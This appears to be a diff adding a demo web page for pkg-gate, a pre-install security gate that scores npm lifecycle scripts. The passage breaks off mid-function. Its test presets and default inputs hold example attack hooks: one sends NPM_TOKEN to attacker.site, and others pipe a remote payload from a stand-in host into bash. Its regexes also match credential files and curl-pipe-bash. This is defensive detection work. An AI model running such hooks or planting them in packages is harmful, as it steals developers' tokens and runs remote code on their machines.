+          <span style="font-size: 11px; font-weight: 600; color: var(--text-subtle);">Phase 1: Spec Extraction</span>
+        </div>
+
+        <!-- Mode Selector Tabs -->
+        <div class="tab-bar">
+          <button class="tab-btn active" data-tab="manifest">package.json</button>
+          <button class="tab-btn" data-tab="script">Raw Command</button>
+          <button class="tab-btn" data-tab="registry">NPM Registry</button>
+        </div>
+
+        <!-- Tab 1: Manifest JSON Input -->
+        <div id="tab-pane-manifest" class="tab-pane">
+          <div class="input-group">
+            <label class="input-label" for="manifest-json-input">Package Manifest (JSON)</label>
+            <textarea id="manifest-json-input" class="code-textarea" spellcheck="false"></textarea>
+          </div>
+        </div>
+
+        <!-- Tab 2: Raw Shell Script Input -->
+        <div id="tab-pane-script" class="tab-pane" style="display: none;">
+          <div class="input-group">
+            <label class="input-label" for="raw-script-input">Lifecycle Shell Command</label>
+            <input type="text" id="raw-script-input" class="text-input" placeholder="e.g. curl -s http://evil.sh | bash" value="curl -s http://attacker.site/payload.sh | bash">
+          </div>
+          <div class="input-group">
+            <label class="input-label" for="raw-script-hook">Hook Name</label>
+            <select id="raw-script-hook" class="text-input">
+              <option value="postinstall">postinstall (default)</option>
+              <option value="preinstall">preinstall</option>
+              <option value="install">install</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Tab 3: NPM Registry Search -->
+        <div id="tab-pane-registry" class="tab-pane" style="display: none;">
+          <div class="input-group">
+            <label class="input-label" for="registry-pkg-input">NPM Package Name</label>
+            <div style="display: flex; gap: 8px;">
+              <input type="text" id="registry-pkg-input" class="text-input" placeholder="e.g. esbuild, canvas, flatmap-stream" value="esbuild">
+              <button class="preset-btn" id="fetch-registry-btn" style="flex-shrink: 0; padding: 0 16px;">Fetch</button>
+            </div>
+          </div>
+          <p style="font-size: 11px; color: var(--text-subtle); margin-top: 4px;">
+            Fetches live manifest from registry.npmjs.org and extracts pre/postinstall hooks.
+          </p>
+        </div>
+
+        <!-- Engine Settings -->
+        <div class="engine-section">
+          <div class="engine-toggle-row">
+            <div>
+              <div class="engine-label">Evaluation Engine</div>
+              <div class="engine-desc" id="engine-desc-text">Calibrated TypeSafe System One offline engine</div>
+            </div>
+            <div class="toggle-switch">
+              <button class="toggle-opt active" id="btn-engine-sim" data-engine="sim">Simulator</button>
+              <button class="toggle-opt" id="btn-engine-api" data-engine="api">Live API</button>
+            </div>
+          </div>
+
+          <div class="api-key-wrap" id="api-key-box">
+            <label class="input-label" for="api-key-input">TypeSafe API Key</label>
+            <input type="password" id="api-key-input" class="text-input" placeholder="ts_... (stored only in localStorage)">
+            <p style="font-size: 10px; color: var(--text-subtle); margin-top: 4px;">
+              Calls model jev-latest directly via HTTPS. Key is never transmitted anywhere else.
+            </p>
+          </div>
+        </div>
+
+        <!-- Run Evaluation Button -->
+        <button class="eval-btn" id="run-eval-btn">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+          <span>Evaluate Security Gate</span>
+        </button>
+      </div>
+
+      <!-- RIGHT COLUMN: VERDICT & STRUCTURED FINDINGS -->
+      <div class="card" id="results-container">
+        
+        <!-- Big Dynamic Verdict Hero Card (Pastel States) -->
+        <div class="verdict-banner block" id="verdict-card">
+          <div class="verdict-top">
+            <span class="verdict-badge" id="verdict-badge">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" id="verdict-badge-icon"><circle cx="12" cy="12" r="10"/></svg>
+              <span id="verdict-action-text">BLOCK</span>
+            </span>
+            <span class="target-meta" id="verdict-pkg-label">flatmap-evil@0.1.1</span>
+          </div>
+          <h3 class="verdict-headline" id="verdict-headline">Credential Exfiltration Blocked</h3>
+          <p class="verdict-summary" id="verdict-summary">
+            Critical security threat detected. Script attempts unauthorized access and transmission of private environment tokens.
+          </p>
+
+          <!-- 4 Metric Cards Row -->
+          <div class="metrics-row">
+            <div class="metric-tile">
+              <div class="metric-name">Threat Severity</div>
+              <div class="metric-val" id="metric-score">2.85 <span style="font-size: 11px; font-weight: 500; color: var(--text-subtle);">/ 3.0</span></div>
+              <div class="metric-sub" id="metric-rubric">Critical threat</div>
+            </div>
+            <div class="metric-tile">
+              <div class="metric-name">Confidence</div>
+              <div class="metric-val" id="metric-confidence">89%</div>
+              <div class="metric-sub">Deterministic gate</div>
+            </div>
+            <div class="metric-tile">
+              <div class="metric-name">Decision Gate</div>
+              <div class="metric-val" id="metric-gate">Policy Rule</div>
+              <div class="metric-sub" id="metric-gate-sub">Score &gt;= 2.0</div>
+            </div>
+            <div class="metric-tile">
+              <div class="metric-name">Evaluation Latency</div>
+              <div class="metric-val" id="metric-latency">&lt; 1ms</div>
+              <div class="metric-sub" id="metric-engine-name">Local Simulator</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Lifecycle Scripts Findings Breakdown -->
+        <div class="findings-section">
+          <h3 class="section-subhead">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+            <span>Lifecycle Script Evaluation (<span id="scripts-count">1</span> found)</span>
+          </h3>
+
+          <div id="findings-list">
+            <!-- Dynamically populated finding cards -->
+          </div>
+        </div>
+
+        <!-- Policy Gating Reasons -->
+        <div class="findings-section">
+          <h3 class="section-subhead">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
+            <span>Policy Verdict Triggers</span>
+          </h3>
+          <ul class="reasons-list" id="reasons-list">
+            <!-- Dynamically populated reasons -->
+          </ul>
+        </div>
+
+        <!-- Equivalent Terminal CLI Command -->
+        <div class="findings-section">
+          <h3 class="section-subhead">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+            <span>Equivalent Terminal Command</span>
+          </h3>
+          <div class="command-box" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0;">
+            <code id="cli-equivalent-cmd">npx pkg-gate test/fixtures/credential-theft.json</code>
+            <button class="copy-btn" id="copy-equiv-btn" title="Copy command" aria-label="Copy command">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- Structured Output View (Collapsible) -->
+        <div class="inspector-card">
+          <div class="inspector-header">
+            <span class="inspector-title">Structured JSON Output (report.structured)</span>
+            <button class="copy-btn" id="copy-json-btn" title="Copy JSON" aria-label="Copy JSON">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+          <pre class="json-code-box" id="json-output-box"></pre>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ARCHITECTURE FLOW DIAGRAM (Embedded SVG with High-Res Clean Presentation) -->
+    <section class="flow-section" id="flow">
+      <div class="flow-card">
+        <div class="flow-card-header">
+          <div>
+            <h2 class="flow-heading">End-to-End Security Architecture</h2>
+            <p class="flow-desc">
+              How pkg-gate intercepts lifecycle hooks, fans out parallel evaluation questions to TypeSafe System One, and routes decisions through confidence-gated thresholds.
+            </p>
+          </div>
+          <a href="flow-diagram.svg" target="_blank" class="preset-btn" style="text-decoration: none;">
+            <span>Open High-Res SVG</span>
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+          </a>
+        </div>
+        <div class="svg-container">
+          <img src="flow-diagram.svg" alt="pkg-gate pre-install security flow architecture diagram" loading="lazy">
+        </div>
+      </div>
+    </section>
+
+    <!-- HOW IT WORKS & PRINCIPLES (Asymmetrical Anti-Slop Layout) -->
+    <section class="principles-section" id="principles">
+      <div class="principles-grid">
+        <div class="principle-box">
+          <span class="principle-tag honey">Confidence-Gated Routing</span>
+          <h3 class="principle-title">Never guess on uncertain signals.</h3>
+          <p class="principle-text">
+            Standard AI evaluations either blindly hallucinate confidence or pass ambiguous payloads. pkg-gate defines a strict confidence floor of 50%. When model ambiguity spikes, execution automatically routes to human interactive confirmation with exact reasons.
+          </p>
+        </div>
+        <div class="principle-box">
+          <span class="principle-tag sage">Deterministic Policy Gate</span>
+          <h3 class="principle-title">Calibrated scores, not fuzzy rules.</h3>
+          <p class="principle-text">
+            TypeSafe System One provides structured probability distributions for intent, threat severity, and secret access. The gating decision is strictly code-defined: Block at score &gt;= 2.0 or secret probability &gt;= 0.60; Warn at score &gt;= 1.2 or recon activity.
+          </p>
+        </div>
+        <div class="principle-box">
+          <span class="principle-tag lavender">Speculative Fan-out</span>
+          <h3 class="principle-title">Parallel evaluation across lifecycle hooks.</h3>
+          <p class="principle-text">
+            Packages with multiple hooks (preinstall, install, postinstall) are evaluated concurrently in parallel. If zero lifecycle scripts are defined, pkg-gate short-circuits instantly in less than 1ms with a guaranteed safe verdict.
+          </p>
+        </div>
+        <div class="principle-box">
+          <span class="principle-tag sage">Zero-Config Offline Simulator</span>
+          <h3 class="principle-title">Calibrated local fallback engine.</h3>
+          <p class="principle-text">
+            Without an API key or when network connectivity drops, pkg-gate automatically falls back to an offline rule-calibrated simulator that replicates the System One answer schema so development pipelines never halt.
+          </p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <div>
+      <span>pkg-gate - Pre-install security gate for npm lifecycle scripts.</span>
+      <span style="display: block; font-size: 11px; margin-top: 4px; color: var(--text-subtle);">
+        Crafted with pastel styling and anti-slop guidelines. MIT License.
+      </span>
+    </div>
+    <div class="footer-links">
+      <a href="https://github.com/hemanth/pkg-gate" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub</a>
+      <a href="https://typesafe.ai" target="_blank" rel="noopener noreferrer" class="footer-link">TypeSafe AI</a>
+      <a href="https://h3manth.com" target="_blank" rel="noopener noreferrer" class="footer-link">Hemanth HM</a>
+    </div>
+  </footer>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast-notify">Copied to clipboard</div>
+
+  <!-- SCRIPT: CORE EVALUATION ENGINE & INTERACTIVE PLAYGROUND -->
+  <script>
+    /* ==========================================================================
+       CURATED PRESETS DATA
+       ========================================================================== */
+    const PRESETS = {
+      'credential-theft': {
+        name: 'flatmap-evil',
+        version: '0.1.1',
+        description: 'Malicious package that steals npm auth tokens and environment variables',
+        scripts: {
+          postinstall: 'node -e "const t = process.env.NPM_TOKEN; fetch(\'https://attacker.site/log\', {method:\'POST\', body: t});"'
+        }
+      },
+      'reverse-shell': {
+        name: 'typo-popular-pkg',
+        version: '1.0.0',
+        description: 'Typosquatted package executing reverse shell dropper',
+        scripts: {
+          preinstall: 'curl -s http://c2.evil.com/payload.sh | bash'
+        }
+      },
+      'recon-probe': {
+        name: 'recon-pkg',
+        version: '0.0.1',
+        description: 'Package attempting host environment reconnaissance',
+        scripts: {
+          postinstall: 'uname -a && whoami && hostname'
+        }
+      },
+      'binary-download': {
+        name: 'fast-tool',
+        version: '2.0.0',
+        description: 'Precompiled native executable downloader',
+        scripts: {
+          postinstall: 'node ./install.js --download-binary https://github.com/fast-tool/releases'
+        }
+      },
+      'native-build': {
+        name: 'native-addon',
+        version: '1.4.0',
+        description: 'Native C++ addon compiling through node-gyp',
+        scripts: {
+          install: 'node-gyp rebuild'
+        }
+      },
+      'clean-pkg': {
+        name: 'clean-utility',
+        version: '1.0.0',
+        description: 'A clean utility with zero install scripts',
+        scripts: {
+          test: 'node test.js'
+        }
+      }
+    };
+
+    /* Policy Thresholds (matches src/questions.js) */
+    const THRESHOLDS = {
+      BLOCK_SCORE: 2.0,
+      WARN_SCORE: 1.2,
+      BLOCK_SECRET_NOUL: 0.6,
+      WARN_SECRET_NOUL: 0.3,
+      BLOCK_REMOTE_EXEC_NOUL: 0.6,
+      WARN_REMOTE_EXEC_NOUL: 0.3,
+      CONFIDENCE_FLOOR: 0.5,
+    };
+
+    /* Current State */
+    let currentTab = 'manifest';
+    let currentEngine = 'sim';
+    let currentManifest = JSON.parse(JSON.stringify(PRESETS['credential-theft']));
+
+    /* ==========================================================================
+       OFFLINE EVALUATION SIMULATOR (matches src/simulator.js)
+       ========================================================================== */
+    function simulateLifecycleEvaluation(hookName, scriptContent, pkg) {
+      const content = String(scriptContent || '').toLowerCase();
+      const rawContent = String(scriptContent || '');
+
+      const stealsSecrets =
+        /(?:npm_token|aws_access_key|id_rsa|\.ssh|\.npmrc|\.aws|process\.env|env\s*\|\s*curl)/i.test(rawContent);
+
+      const pipesRemote =
+        /(?:curl|wget)\s+.*\|\s*(?:bash|sh|node)|eval\s*\(\s*buffer\.from|eval\s*\(\s*atob/i.test(rawContent);
+
+      const isObfuscated =
+        /(?:\\x[0-9a-f]{2}){4,}|(?:[A-Za-z0-9+/]{40,}={0,2})/i.test(rawContent);
+
+      const isRecon =
+        /(?:uname\s+-a|whoami|cat\s+\/etc\/passwd|ipconfig|ifconfig|hostname)/i.test(rawContent);
+
+      const isNativeBuild =
+        /(?:node-gyp\s+rebuild|cmake-js|prebuild-install|cargo\s+build|tsc\b)/i.test(content);
+
+      const isBinaryDownload =
+        /(?:download.*binary|node\s+install\.js|release\/download|github\.com\/.*\/releases)/i.test(content);
+
+      const isNotice =
+        /(?:opencollective|fund|echo\s+["'].*thank|exit\s+0)/i.test(content);
+
+      let intent = 'other';
+      let severityScore = 0.2;
+      let secretProb = 0.05;
+      let remoteExecProb = 0.05;
+      let confidence = 0.92;
+
+      if (stealsSecrets || (pipesRemote && isObfuscated)) {
+        intent = stealsSecrets ? 'credential_access' : 'obfuscated_exec';
+        severityScore = 2.85;
+        secretProb = stealsSecrets ? 0.96 : 0.75;
+        remoteExecProb = pipesRemote ? 0.94 : 0.65;
+        confidence = 0.89;
+      } else if (pipesRemote) {
+        intent = 'obfuscated_exec';
+        severityScore = 2.45;
+        secretProb = 0.40;
+        remoteExecProb = 0.92;
+        confidence = 0.85;
+      } else if (isRecon) {
+        intent = 'system_recon';
+        severityScore = 1.65;
+        secretProb = 0.55;
+        remoteExecProb = 0.25;
+        confidence = 0.78;
+      } else if (isBinaryDownload) {
+        intent = 'binary_download';
+        severityScore = 0.85;
+        secretProb = 0.08;
+        remoteExecProb = 0.15;
+        confidence = 0.91;
+      } else if (isNativeBuild) {
+        intent = 'build_tool';
+        severityScore = 0.15;
+        secretProb = 0.02;
+        remoteExecProb = 0.03;
+        confidence = 0.98;
+      } else if (isNotice) {
+        intent = 'benign_notice';
+        severityScore = 0.05;
+        secretProb = 0.01;
+        remoteExecProb = 0.01;
+        confidence = 0.99;
+      }
+
+      const rubricText = {
+        0: 'Safe: standard build or benign command with no external network or secret access',
+        1: 'Low risk: fetches known binary from release domain or routine package setup',
+        2: 'Suspicious: makes non-standard outbound connections, inspects system environment, or runs encoded commands',
+        3: 'Critical threat: credential harvesting, token exfiltration, backdoor dropper, or destructive action'
+      };
+
+      return {
+        model: 'jev-latest (calibrated simulator)',
+        answers: {
+          script_intent: {
+            type: 'choice',
+            choice: intent,
+            probabilities: {
+              [intent]: 0.85,
+              other: 0.15,
+            },
+            confidence,
+          },
+          threat_severity: {
+            type: 'score',
+            score: severityScore,
+            rubricLevel: rubricText[Math.round(severityScore)],
+            confidence,
+          },
+          accesses_secrets: {
+            type: 'noul',
+            noul: secretProb,
+          },
+          remote_execution: {
+            type: 'noul',
+            noul: remoteExecProb,
+          },
+        },
+        usage: { input_tokens: 180, output_tokens: 38 }
+      };
+    }
+
+    /* Extract lifecycle hooks */
+    function extractLifecycleScripts(scripts = {}) {
+      const hooks = ['preinstall', 'install', 'postinstall'];
+      const extracted = [];
+      for (const hook of hooks) {
+        if (scripts && typeof scripts[hook] === 'string' && scripts[hook].trim().length > 0) {
+          extracted.push({ hook, command: scripts[hook].trim() });
+        }
+      }
+      return extracted;
+    }
+
+    /* ==========================================================================
+       PACKAGE EVALUATOR (matches src/gate.js)
+       ========================================================================== */
+    async function evaluatePackage(manifest, options = {}) {
+      const startTime = performance.now();
+      const scripts = extractLifecycleScripts(manifest.scripts);
+
+      // Fast path: No lifecycle scripts found
+      if (scripts.length === 0) {
+        return {
+          name: manifest.name || 'unnamed-pkg',
+          version: manifest.version || '1.0.0',
+          action: 'allow',
+          score: 0.0,
+          confidence: 1.0,
+          findings: [],
+          reasons: ['No lifecycle scripts found; package cannot execute arbitrary code on install'],
+          latencyMs: Math.round(performance.now() - startTime),
+        };
+      }
+
+      const findings = [];
+      const reasons = [];
+
+      let maxScore = 0.0;
+      let minConfidence = 1.0;
+      let maxSecretProb = 0.0;
+      let maxRemoteProb = 0.0;
+
+      for (const { hook, command } of scripts) {
+        let result;
+        if (options.engine === 'api' && options.apiKey) {
+          try {
+            // Live TypeSafe System One cloud inference
+            const resp = await fetch('https://api.typesafe.ai/v1/system-one', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${options.apiKey}`,
+              },
+              body: JSON.stringify({
+                state: {
+                  package: {
+                    name: manifest.name,
+                    version: manifest.version,
+                    description: manifest.description,
+                  },
+                  lifecycle_hook: hook,
+                  script_content: command,
+                },
+                questions: {
+                  script_intent: { type: 'choice' },
+                  threat_severity: { type: 'score' },
+                  accesses_secrets: { type: 'noul' },
+                  remote_execution: { type: 'noul' },
+                }
+              })
+            });
+            if (!resp.ok) throw new Error(`API HTTP ${resp.status}`);
+            result = await resp.json();
+          } catch (err) {
+            console.warn('TypeSafe API call failed, falling back to simulator:', err);
+            result = simulateLifecycleEvaluation(hook, command, manifest);
+            result.model = 'jev-latest (fallback simulator)';
+          }
+        } else {
+          result = simulateLifecycleEvaluation(hook, command, manifest);
+        }
+
+        const answers = result.answers;
+        findings.push({
+          hook,
+          command,
+          answers,
+          model: result.model,
+        });
+
+        const intent = answers.script_intent?.choice;
+        const intentConfidence = answers.script_intent?.confidence ?? 1.0;
+        const severity = answers.threat_severity?.score ?? 0.0;
+        const severityConfidence = answers.threat_severity?.confidence ?? 1.0;
+        const secretNoul = answers.accesses_secrets?.noul ?? 0.0;
+        const remoteNoul = answers.remote_execution?.noul ?? 0.0;
+
+        if (severity > maxScore) maxScore = severity;
+        if (secretNoul > maxSecretProb) maxSecretProb = secretNoul;
+        if (remoteNoul > maxRemoteProb) maxRemoteProb = remoteNoul;
+
+        const lowestConf = Math.min(intentConfidence, severityConfidence);
+        if (lowestConf < minConfidence) minConfidence = lowestConf;
+
+        if (secretNoul >= THRESHOLDS.WARN_SECRET_NOUL) {
+          reasons.push(`[${hook}] Probable credential access (${Math.round(secretNoul * 100)}% probability)`);
+        }
+        if (remoteNoul >= THRESHOLDS.WARN_REMOTE_EXEC_NOUL) {
+          reasons.push(`[${hook}] Remote code download or execution detected (${Math.round(remoteNoul * 100)}% probability)`);
+        }
+        if (intent === 'credential_access' || intent === 'obfuscated_exec') {
+          reasons.push(`[${hook}] High-risk script intent classified as "${intent}"`);
+        }
+        if (severity >= THRESHOLDS.WARN_SCORE) {
+          reasons.push(`[${hook}] Threat severity score elevated (${severity.toFixed(2)} / 3.0)`);
+        }
+      }
+
+      let action = 'allow';
+      const isCritical =
+        maxScore >= THRESHOLDS.BLOCK_SCORE ||
+        maxSecretProb >= THRESHOLDS.BLOCK_SECRET_NOUL ||
+        maxRemoteProb >= THRESHOLDS.BLOCK_REMOTE_EXEC_NOUL;
+
+      const isSuspicious =
+        maxScore >= THRESHOLDS.WARN_SCORE ||
+        maxSecretProb >= THRESHOLDS.WARN_SECRET_NOUL ||
+        maxRemoteProb >= THRESHOLDS.WARN_REMOTE_EXEC_NOUL;
+
+      const isUncertain = minConfidence < THRESHOLDS.CONFIDENCE_FLOOR;
+
+      if (isCritical) {
+        action = 'block';
+      } else if (isSuspicious) {
+        action = 'warn';
+      } else if (isUncertain) {
+        action = 'warn';
+        reasons.push(`Low evaluation confidence (${Math.round(minConfidence * 100)}%); human verification required`);
+      }
+
+      if (action === 'allow' && reasons.length === 0) {
+        reasons.push('Lifecycle scripts verified benign (standard build or verified binary)');
+      }
+
+      const latencyMs = Math.round(performance.now() - startTime);
+
+      return {
+        name: manifest.name || 'unnamed-package',
+        version: manifest.version || '1.0.0',
+        action,
+        score: maxScore,
+        confidence: minConfidence,
+        findings,
+        reasons,
+        latencyMs,
+        structured: {
+          schemaVersion: '1.0.0',
+          package: {
+            name: manifest.name || 'unnamed-package',
+            version: manifest.version || '1.0.0',
+          },
+          verdict: {
+            action,
+            score: Number(maxScore.toFixed(2)),
+            confidence: Number(minConfidence.toFixed(2)),
+            isSafe: action === 'allow',
+          },
+          scripts: findings.map((f) => ({
+            hook: f.hook,
+            command: f.command,
+            model: f.model,
+            intent: f.answers.script_intent ? {
+              choice: f.answers.script_intent.choice,
+              confidence: Number(f.answers.script_intent.confidence.toFixed(2)),
+            } : null,
+            severity: f.answers.threat_severity ? {
+              score: Number(f.answers.threat_severity.score.toFixed(2)),
+              confidence: Number(f.answers.threat_severity.confidence.toFixed(2)),
+              rubricLevel: f.answers.threat_severity.rubricLevel,
+            } : null,
+            accessesSecrets: f.answers.accesses_secrets ? {
+              probability: Number(f.answers.accesses_secrets.noul.toFixed(2)),
+            } : null,
+            remoteExecution: f.answers.remote_execution ? {
+              probability: Number(f.answers.remote_execution.noul.toFixed(2)),
+            } : null,
+          })),
+          policy: {
+            thresholds: THRESHOLDS,
+            reasons,
+          },
+          telemetry: {
+            latencyMs,
+          }
+        }
+      };
+    }
+
+    /* ==========================================================================
+       RENDER RESULTS TO DOM
+       ========================================================================== */
+    function renderResults(report) {
+      const banner = document.getElementById('verdict-card');
+      const badge = document.getElementById('verdict-badge');
+      const actionText = document.getElementById('verdict-action-text');
+      const pkgLabel = document.getElementById('verdict-pkg-label');
+      const headline = document.getElementById('verdict-headline');
+      const summary = document.getElementById('verdict-summary');
+
+      // Update pastel banner state
+      banner.className = `verdict-banner ${report.action}`;
+      actionText.textContent = report.action.toUpperCase();
+      pkgLabel.textContent = `${report.name}@${report.version}`;
+
+      if (report.action === 'block') {
+        headline.textContent = 'High-Risk Lifecycle Script Blocked';
+        summary.textContent = 'Execution aborted before install. Critical threat detected that violates supply chain security policy.';
+      } else if (report.action === 'warn') {
+        headline.textContent = 'Suspicious Indicators Found - Manual Review Advised';
+        summary.textContent = 'Elevated threat severity or recon activities detected. Confirmation required before proceeding.';
+      } else {
+        headline.textContent = 'Lifecycle Scripts Verified Benign';
+        summary.textContent = 'All hooks inspected and verified safe. Package conforms to normal build and binary installation patterns.';
+      }
+
+      // Metrics
+      document.getElementById('metric-score').innerHTML = `${report.score.toFixed(2)} <span style="font-size: 11px; font-weight: 500; color: var(--text-subtle);">/ 3.0</span>`;
+      
+      let rubric = 'Safe';
+      if (report.score >= 2.0) rubric = 'Critical threat';
+      else if (report.score >= 1.2) rubric = 'Suspicious';
+      else if (report.score >= 0.5) rubric = 'Low risk';
+      document.getElementById('metric-rubric').textContent = rubric;
+
+      document.getElementById('metric-confidence').textContent = `${Math.round(report.confidence * 100)}%`;
+      
+      const gateText = report.action === 'block' ? 'Block Gate' : (report.action === 'warn' ? 'Warn Gate' : 'Allow Gate');
+      document.getElementById('metric-gate').textContent = gateText;
+      document.getElementById('metric-gate-sub').textContent = report.score >= 2.0 ? 'Score >= 2.0' : 'Score < 1.2';
+      
+      document.getElementById('metric-latency').textContent = `${report.latencyMs}ms`;
+      document.getElementById('metric-engine-name').textContent = currentEngine === 'api' ? 'Live System One' : 'Calibrated Sim';
+
+      // Findings List
+      const scriptsCountEl = document.getElementById('scripts-count');
+      scriptsCountEl.textContent = report.findings.length;
+
+      const findingsListEl = document.getElementById('findings-list');
+      findingsListEl.innerHTML = '';
+
+      if (report.findings.length === 0) {
+        findingsListEl.innerHTML = `
+          <div class="finding-card" style="text-align: center; color: var(--text-muted); padding: 24px;">
+            No lifecycle scripts (preinstall, install, postinstall) present in manifest.
+          </div>
+        `;
+      } else {
+        report.findings.forEach(f => {
+          const intent = f.answers.script_intent?.choice || 'unknown';
+          const secProb = Math.round((f.answers.accesses_secrets?.noul || 0) * 100);
+          const remProb = Math.round((f.answers.remote_execution?.noul || 0) * 100);
+
+          const secClass = secProb >= 60 ? 'danger' : (secProb >= 30 ? 'warn' : 'safe');
+          const remClass = remProb >= 60 ? 'danger' : (remProb >= 30 ? 'warn' : 'safe');
+
+          const card = document.createElement('div');
+          card.className = 'finding-card';
+          card.innerHTML = `
+            <div class="finding-header">
+              <span class="hook-badge">${f.hook}</span>
+              <span style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted);">
+                Intent: <strong>${intent}</strong>
+              </span>
+            </div>
+            <div class="command-box"><code>${escapeHtml(f.command)}</code></div>
+            <div class="gauges-grid">
+              <div class="gauge-box">
+                <div class="gauge-top">
+                  <span>Credential Exfiltration</span>
+                  <span class="gauge-pct">${secProb}%</span>
+                </div>
+                <div class="progress-track">
+                  <div class="progress-fill ${secClass}" style="width: ${secProb}%"></div>
+                </div>
+              </div>
+              <div class="gauge-box">
+                <div class="gauge-top">
+                  <span>Remote Code Execution</span>
+                  <span class="gauge-pct">${remProb}%</span>
+                </div>
+                <div class="progress-track">
+                  <div class="progress-fill ${remClass}" style="width: ${remProb}%"></div>
+                </div>
+              </div>
+            </div>
+          `;
+          findingsListEl.appendChild(card);
+        });
+      }
+
+      // Reasons List
+      const reasonsListEl = document.getElementById('reasons-list');
+      reasonsListEl.innerHTML = '';
+      report.reasons.forEach(r => {
+        const li = document.createElement('li');
+        li.className = 'reason-item';
+        li.innerHTML = `
+          <span class="reason-icon">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="${report.action === 'block' ? '#dc2626' : (report.action === 'warn' ? '#d97706' : '#10b981')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="8" x2="12" y2="12"></line>
+              <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+          </span>
+          <span>${escapeHtml(r)}</span>
+        `;
+        reasonsListEl.appendChild(li);
+      });
+
+      // Update Equivalent CLI Command
+      const equivCmd = currentTab === 'registry' 
+        ? `npx pkg-gate ${report.name}`
+        : (currentTab === 'script' ? `npx pkg-gate "${document.getElementById('raw-script-input').value.replace(/"/g, '\\"')}"` : `npx pkg-gate ./package.json`);
+      document.getElementById('cli-equivalent-cmd').textContent = equivCmd;
+
+      // Structured JSON view
+      document.getElementById('json-output-box').textContent = JSON.stringify(report.structured, null, 2);
+    }
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    /* ==========================================================================
+       USER INTERACTIONS & EVENT HANDLERS
+       ========================================================================== */
+    function loadPreset(presetKey) {
+      const preset = PRESETS[presetKey];
+      if (!preset) return;
+      currentManifest = JSON.parse(JSON.stringify(preset));
+      document.getElementById('manifest-json-input').value = JSON.stringify(currentManifest, null, 2);
+
+      // If script tab active, update it
+      const hooks = extractLifecycleScripts(currentManifest.scripts);
+      if (hooks.length > 0) {
+        document.getElementById('raw-script-input').value = hooks[0].command;
+        document.getElementById('raw-script-hook').value = hooks[0].hook;
+      }
+
+      // Update preset button active states
+      document.querySelectorAll('.preset-btn[data-preset]').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.preset === presetKey);
+      });
+
+      runEvaluation();
+    }
+
+    async function runEvaluation() {
+      const runBtn = document.getElementById('run-eval-btn');
+      runBtn.disabled = true;
+      runBtn.innerHTML = 'Evaluating...';
+
+      try {
+        let manifestToEval = currentManifest;
+
+        if (currentTab === 'manifest') {
+          try {
+            manifestToEval = JSON.parse(document.getElementById('manifest-json-input').value);
+          } catch (e) {
+            showToast('Invalid JSON syntax in manifest');
+            runBtn.disabled = false;
+            runBtn.innerHTML = 'Evaluate Security Gate';
+            return;
+          }
+        } else if (currentTab === 'script') {
+          const cmd = document.getElementById('raw-script-input').value.trim();
+          const hook = document.getElementById('raw-script-hook').value;
+          manifestToEval = {
+            name: 'inline-script',
+            version: '0.0.0',
+            description: 'Raw command evaluation',
+            scripts: { [hook]: cmd }
+          };
+        }
+
+        const apiKey = localStorage.getItem('typesafe_api_key') || '';
+        const report = await evaluatePackage(manifestToEval, {
+          engine: currentEngine,
+          apiKey,
+        });
+
+        renderResults(report);
+      } catch (err) {
